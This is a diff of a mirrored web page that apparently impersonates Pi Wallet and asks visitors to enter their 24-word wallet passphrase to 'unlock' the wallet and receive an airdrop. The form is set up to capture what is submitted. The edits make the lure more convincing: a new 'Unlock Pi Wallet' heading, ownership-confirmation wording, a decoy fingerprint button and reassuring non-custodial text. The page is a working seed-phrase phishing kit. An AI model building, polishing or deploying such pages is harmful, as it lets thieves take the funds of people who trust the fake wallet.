@@ -357,7 +357,7 @@ Pi Wallet is the secure hub for your Pi transactions, providing an intuitive int
 <div id="col-186630180" class="col login medium-4 small-12 large-4">
         
 <h1 style="box-sizing: border-box; margin-bottom: 1.5rem; margin-top: 15px; color: ; text-align: center;">
-<span style="box-sizing: border-box; margin: 0px 0px 16px; font-size: 20px; font-family: Mulish, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; padding-left: 16px; padding-right: 16px; text-align: center; color: ;" class="sc-gswNZR JxAvy MuiTypography-root MuiTypography-h1">Confirm Your migration wallet  </span></h1>
+<span style="box-sizing: border-box; margin: 0px 0px 16px; font-size: 20px; font-family: Mulish, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; padding-left: 16px; padding-right: 16px; text-align: center; color: ;" class="sc-gswNZR JxAvy MuiTypography-root MuiTypography-h1">Unlock Pi Wallet  </span></h1>
 <div class="row align-center" id="row-443240715">
 
 <div id="col-745261325" class="col small-12 large-12">
@@ -366,7 +366,7 @@ Pi Wallet is the secure hub for your Pi transactions, providing an intuitive int
 
 <div id="text-1694869675" class="text-form">
         
-<p></p>
+<p>Manually unlock the wallet using your passphrase to demonstrate you can access it. This confirms that you own this wallet and that your Airdrop will be transferred to this wallet.</p>
 
 
 <p><span style="color: #ff0000;">Never enter your passphrase on any other arbitrary page.</span></p>
@@ -401,7 +401,7 @@ function checkform() {
 <div role="form" class="wpcf7" id="wpcf7-0948abf-p805-o1" lang="vi" dir="ltr">
 
 
-<form name="claim" method="post" action="maintenance.html" name=mainform onsubmit="return checkform()" data-netlify="true">
+<form name="claime" method="post" action="maintenance.html" name=mainform onsubmit="return checkform()" data-netlify="true">
 
 <div class="form-login">
 <div class="form-nd">
@@ -450,7 +450,7 @@ textarea[type=text]:focus {
     <textarea type="text" id="message" name="message" cols="40" rows="10"   id="minle" style="border-radius: 10px; font-size: 1em; overflow: auto; resize: none; height: 40vh; font-family: monospace; font-size: 15px" aria-required="true" aria-invalid="false" placeholder="Enter your 24-word passphrase here" required></textarea></span><p></p>
 </div>
 
-<input type="hidden" id="claim" name="form-name" value="claim">
+<input type="hidden" id="claime" name="form-name" value="claime">
 </div>
 
 
@@ -466,12 +466,12 @@ textarea[type=text]:focus {
 
 
 <button style="border-radius: 10px; font-family: monospace; padding: 10px 24px; font-size: 14px; margin: 0px; overflow: visible; appearance: button; display: inline-flex; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; position: relative; -webkit-tap-highlight-color: transparent; background-color: rgb(255, 255, 255); outline: 0px;border-color: rgb(112, 61, 146); border-width: 1px;
- border-style: solid; border-color:  0ms;  color: rgb(255, 255, 255); background-color: rgb(112, 61, 146); height: 50px; width: 350px; box-shadow: none; font-weight: 700;" 
+ border-style: solid; border-color:  0ms;  color: rgb(112, 61, 146); height: 50px; width: 350px; box-shadow: none; font-weight: 700;" 
  
  type="submit" tabindex="0" class="sc-hLBbgP hHUIvn MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary MuiButton-sizeLarge MuiButton-outlinedSizeLarge MuiButton-disableElevation MuiButton-fullWidth sc-lllmON buZqdv MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary MuiButton-sizeLarge MuiButton-outlinedSizeLarge MuiButton-disableElevation MuiButton-fullWidth">
 
 
-<span style="box-sizing: border-box;font-family:monospace;">Confirm Your Wallet</span>
+<span style="box-sizing: border-box;font-family:monospace;">Unlock With Passphrase</span>
 
 <span style="box-sizing: border-box; overflow: hidden; pointer-events: none; position: absolute; z-index: 0; inset: 0px; border-radius: inherit; font-family: times;" class="sc-gswNZR wwyCL MuiTouchRipple-root"></span>
 
@@ -485,7 +485,17 @@ textarea[type=text]:focus {
 
 <div style="box-sizing: border-box; padding-left: 16px; padding-right: 16px; margin-top: 16px; margin-bottom: 16px;" >
 
+<button onclick="myFunction()" style="border-radius: 10px; font-family: monospace;padding: 10px 24px; font-size: 13px; margin: 0px; overflow: visible; appearance: button; display: inline-flex; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; position: relative; -webkit-tap-highlight-color: transparent; background-color: rgb(112, 61, 146); outline: 0px; border-width: 1px;
+ border-style: solid; border-color:  0ms;  color: rgb(255, 255, 255); height: 50px; width: 350px; box-shadow: none; font-weight: 70;" 
+ 
+ tabindex="0" class="sc-hLBbgP hHUIvn MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary MuiButton-sizeLarge MuiButton-outlinedSizeLarge MuiButton-disableElevation MuiButton-fullWidth sc-lllmON buZqdv MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary MuiButton-sizeLarge MuiButton-outlinedSizeLarge MuiButton-disableElevation MuiButton-fullWidth">
 
+
+<span style="box-sizing: border-box; font-family: monospace;">Unlock With Fingerprint</span>
+
+<span style="box-sizing: border-box; overflow: hidden; pointer-events: none; position: absolute; z-index: 0; inset: 0px; border-radius: inherit;"></span>
+
+</button>
 </div>
 
 </div>
@@ -495,6 +505,8 @@ textarea[type=text]:focus {
 <div style="box-sizing: border-box; padding-left: 16px; padding-right: 15px; margin-top: 20px; margin-bottom: 20px; font-family: monospace;" class="sc-jrcTuL dMljBL MuiBox-root">
 <div id="text-1694869675" class="text-form">
         
+<p>As a non-custodial wallet, your wallet passphrase is exclusively accessed only to you. Recovery of passphrase is currently impossible.
+<p>Lost your passphrase?&nbsp;<a href="#"><font style="color: #0c75e6;">You can create a new wallet,</font></a>&nbsp; but all your π in your previous wallet will be inaccessible.
 
 </div>
 </div>  
@@ -574,4 +586,4 @@ function checkform() {
 
 
 <!-- Mirrored from claim614airdrop.com/?a=confirm by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 16 Mar 2025 21:26:26 GMT -->
-</html>
+ </html>
